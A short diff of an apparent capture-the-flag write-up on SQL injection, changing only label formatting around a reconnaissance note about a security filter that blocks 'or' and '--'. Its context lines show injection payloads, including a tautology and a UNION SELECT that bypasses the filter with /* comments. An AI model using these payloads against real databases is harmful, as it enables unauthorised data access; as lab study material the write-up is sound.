@@ -8,8 +8,8 @@
 
 **Reconnaissance:**
 
-- *Standard payload:* ` or 1=1-- -` triggered a custom error : **Input rejected by security filter.**
-- *Blocked*: The word `or` and standard comment characters `--`.
+- **Standard payload**: ` or 1=1-- -` triggered a custom error : **Input rejected by security filter.**
+- **Block**: The word `or` and standard comment characters `--`.
 
 **Exploitation:**
 
@@ -58,4 +58,5 @@ Kiwi' and Department='Management'/*
 ```sql
 x' union select *,2,3,4 from CITADEL_ARCHIVE_2077/*
 ```
+
 
